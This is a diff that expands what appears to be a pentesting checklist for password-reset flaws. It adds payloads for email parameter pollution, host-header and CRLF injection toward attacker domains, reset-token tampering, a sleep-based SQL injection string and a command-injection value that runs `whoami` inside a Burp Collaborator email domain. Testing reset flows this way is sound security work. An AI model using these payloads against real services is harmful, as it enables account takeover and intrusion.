@@ -20,14 +20,42 @@ Request a reset token, change the password or email, and then try using the old 
 ### 5. Leakage of Reset Token via Referer Headers
 After sending the password reset token to the reset page, use tools like Burp Suite to check if the token leaks in the Referer headers or in the response.
 
-### 6. Inserting Attacker's Email with Victim’s in the Request
-Try different email formats such as:
-- `email=victim@xyz.tld,hacker@xyz.tld`
-- `email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld`
-- JSON format: `"email": "victim@xyz", "email": "hacker@xyz"`
+### 6. Email Parameter Pollution in JSON and URL Encoded Format
+ذذ  `
+```
+email=victim@gmail.com&email=attacker@gmail.com  
+email[]=victim@gmail.com&email[]=attacker@gmail.com  
+email=victim@gmail.com%20email=attacker@gmail.com  
+email=victim@gmail.com|email=attacker@gmail.com  
+email=v@g.com&email=a@g.com  
+email=v@g.com%20email=a@g.com  
+email=v@g.com|email=a@g.com  
+email=v@g.com,a@g.com  
+email=v@g.com%20a@g.com  
+email=victim@xyz.tld,hacker@xyz.tld  
+email=victim@xyz.tld%20hacker@xyz.tld  
+email=victim@xyz.tld hacker@xyz.tld  
+{ "email" : "Victim@gmail.com,Attacker@gmail.com" , "email" : "Victim@gmail.com" }  
+{ "email" : "Victim@gmail.com" , "email" : "Victim@gmail.com,Attacker@gmail.com" }  
+{"email":"victim@gmail.com","email":"attacker@gmail.com"}  
+{"email":["victim@gmail.com","attacker@gmail.com"]}  
+{"email":"v@g.com","email":"a@g.com"}  
+{"email":["v@g.com","a@g.com"]}
+```
 
-### 7. Host Header Injection
-Intercept the request and modify the host header to `attacker.com`. Check your email to see if the password reset link contains the attacker’s domain.
+### **7. Host Header Injection or Repeating Host Header to Change Domain in Password Reset Link**
+
+```
+Host: targe.com  
+Host: targe.comcollaborator.com  
+X-Forwarded-Host: targe.comcollaborator.com  
+Referer: targe.comcollaborator.com  
+Origin: targe.comcollaborator.com  
+x-Host: targe.comcollaborator.com  
+true-client-ip: targe.comcollaborator.com  
+x-forwarded: targe.comcollaborator.com  
+X-Forwarded-For: targe.comcollaborator.com  
+```
 
 ### 8. Response Manipulation
 Change the response text to insert an incorrect OTP (One-Time Password) and check if it allows access to the reset password page without a valid OTP.
@@ -58,3 +86,84 @@ Test modifying the email parameter using hashes or spaces to check if it reveals
 
 ### 17. Sending Password Reset Link in Plain Text Without TLS
 If the password reset link is sent in plain text instead of using TLS (Transport Layer Security), it exposes the link to interception by attackers.
+
+### **18. Use Your Token on the Victim's Email**  
+```
+email=victim@gmail.com&token=YOUR-TOKENYOUR-TOKENYOUR-TOKEN
+```
+
+### **19. HTML Injection in Host Header**  
+```
+Host: attacker">.com
+```
+
+### **20. Remove the Token from the Link**  
+
+### **21. Test CRLF Injection in URL**  
+```
+GET /resetPassword?%0d%0aHost:atracker.tld  
+GET /resetPassword?redirect_uri=%0d%0aHost:atracker.tld
+```
+
+### **22. Change Token to 0000**  
+```
+http://example.com/reset?email=victims@gmail.com&token=0000000000
+```
+
+### **23. Change Token to null**  
+```
+http://example.com/reset?email=victims@gmail.com&token=null
+```
+
+### **24. Use a List of Old Tokens**  
+```
+http://example.com/reset?email=victims@gmail.com&token=[oldtoken1,oldtoken2]
+```
+
+### **25. Change Content Type**  
+```
+Change request content type (XML <> JSON)
+```
+
+### **26. Large Token**  
+```
+http://example.com/reset?email=victims@gmail.com&token=1000000-long-string
+```
+
+### **27. Cross-Domain Token Usage**  
+- If the application has multiple domains using the same reset mechanism, try using a token generated from one domain on another.
+
+### **28. Register the Same Email with a Different Domain**  
+- Example: `.eu`, `.net`, and alter the email in the change email link.
+
+### **29. Broken Token Encryption**  
+- Test if you can guess how password reset tokens are generated.
+
+### **30. Manipulating Password Reset Request Links**  
+```
+POST https://attacker.com/resetpassword.php HTTP/1.1  
+POST @attacker.com/resetpassword.php HTTP/1.1  
+POST :@attacker.com/resetpassword.php HTTP/1.1  
+POST /resetpassword.php@attacker.com HTTP/1.1  
+```
+
+### **31. SQL Injection Payload**  
+```
+test@test.com'+(select*from(select(sleep(2)))a)+'  
+```
+
+### **32. Command Injection**  
+```
+email=hello@`whoami`.xyz.burpcollaborator.net  
+```
+
+### **33. Data Truncation: Create Two Emails with Different Domains and Cut After @  or Without Extension**  
+```
+email=victim  
+email=victim@xyz  
+```
+
+### **34. Add Extension (.json)**  
+```
+POST /resetpassword.json?email=victim@xyz.tld
+```
